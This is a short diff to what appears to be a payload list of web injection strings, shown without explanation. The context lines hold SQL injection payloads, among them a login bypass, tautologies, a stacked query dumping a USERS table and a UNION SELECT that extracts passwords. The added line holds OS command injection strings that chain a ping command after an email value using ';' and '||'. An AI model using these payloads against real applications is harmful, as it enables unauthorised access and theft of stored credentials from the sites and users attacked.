@@ -7,7 +7,7 @@ admin'--     //Username input
 " or ""="
 SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"="%";
 'union+select+null,null||'~'||password+from+users--
-
+@mail;ping+-c+10+127.0.0.1;                  @mail||ping+-c+10+127.0.0.1||    
 
 
 ```````````````````
